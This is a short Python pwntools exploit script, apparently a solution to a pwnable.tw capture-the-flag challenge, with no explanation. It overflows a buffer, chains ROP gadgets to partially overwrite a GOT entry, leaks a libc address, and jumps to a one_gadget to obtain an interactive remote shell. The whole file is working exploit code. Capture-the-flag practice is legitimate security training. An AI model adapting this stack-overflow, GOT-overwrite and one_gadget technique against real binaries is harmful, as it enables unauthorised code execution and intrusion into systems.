from pwn import *

context(os='linux', arch='amd64')



p=remote("chall.pwnable.tw",10403)



read_got=0x601000

read_plt=0x400430

sleep_got=0x601010

bss=0x601028

gad1=0x4005e6
gad2=0x4005d0



rop1=p64(gad1)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0x0)+p64(bss)+p64(0x110)+p64(gad2)+"e"*0x10+p64(bss)+"e"*0x20+p64(0x400576)

sleep(3)

raw_input()



p.send("a"*24+rop1)





rop2= p64(0)+p64(gad1)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0x0)+p64(read_got)+p64(0x1)+p64(gad2)+"e"*0x38
rop2+= p64(gad1)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0x1)+p64(sleep_got)+p64(0x8)+p64(gad2)+"e"*0x10+p64(0x601148)+"e"*0x20+p64(0x40055b)



p.send(rop2)



sleep(1)



p.send("\x7e")



sleep=0xcb680

libc_base = u64(p.recvuntil('\x00',drop=True).ljust(0x8,"\x00"))-sleep
print "libc_base : " + hex(libc_base)



one_offset=0x4526a

one_gadget=libc_base+one_offset





p.send("a"*24+p64(one_gadget)+"\x00"*0xe0)





p.interactive()
